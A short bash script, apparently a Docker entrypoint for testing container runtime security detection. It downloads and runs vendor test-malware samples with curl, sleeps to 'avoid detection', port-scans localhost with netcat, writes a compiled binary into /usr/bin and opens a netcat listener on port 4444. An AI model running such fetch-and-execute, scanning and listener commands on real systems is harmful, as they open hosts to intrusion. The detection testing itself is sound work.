#!/bin/bash
# https://github.com/xmrig/xmrig/releases

#/opt/

echo -e "###### Executing the suspicious entrypoint script inside the Docker container ######\n"
echo -e "###### Sleeping 30 seconds to avoid detection before doing bad things... ######\n"

sleep 30
echo -e "###### Downloading wildfire test malware... ###### \n"

curl -s https://wildfire.paloaltonetworks.com/publicapi/test/elf --output sample1
curl -s https://wildfire.paloaltonetworks.com/publicapi/test/pe --output sample2
curl -s https://wildfire.paloaltonetworks.com/publicapi/test/apk --output sample3

chmod +x sample1 sample2 sample3

echo -e "###### Executing wildfire test malware... ######\n"
./sample1

echo -e "###### Running port scanning ... ######\n"
netcat -z -v 127.0.0.1 1-1000 2>&1 | grep succeeded

echo -e "###### Creating a modified binary and replacing a legitimate binary with that... ######\n"
echo -e "#include <stdio.h>\nint main() { printf(\"Hello, World\"); return 0; }" > /tmp/main2.c
gcc /tmp/main2.c -o /usr/bin/main2.o

echo -e "###### starting a netcat listner in the background on port 4444... ######\n"
netcat -l 4444 &